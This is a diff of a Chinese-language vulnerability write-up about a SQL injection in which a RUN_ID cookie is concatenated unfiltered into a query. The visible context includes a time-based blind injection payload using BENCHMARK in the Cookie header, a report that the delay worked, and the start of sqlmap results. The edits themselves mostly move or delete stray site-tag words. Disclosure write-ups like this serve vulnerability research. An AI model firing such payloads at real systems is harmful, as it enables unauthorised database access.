@@ -35,14 +35,6 @@ $res = exequery( $connection, $sql );
 
 `RUN_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
-深入探索
-
-WebService
-
-Windows安全工具
-
-信息安全服务
-
 # 漏洞复现
 
 ```
@@ -55,9 +47,9 @@ Cookie: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
 
 成功在延时 5 秒
 
-编程
-
 [sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
+
+编程
 
 ```
 sqlmap identified the following injection point(s) with a total of 378 HTTP(s) requests:
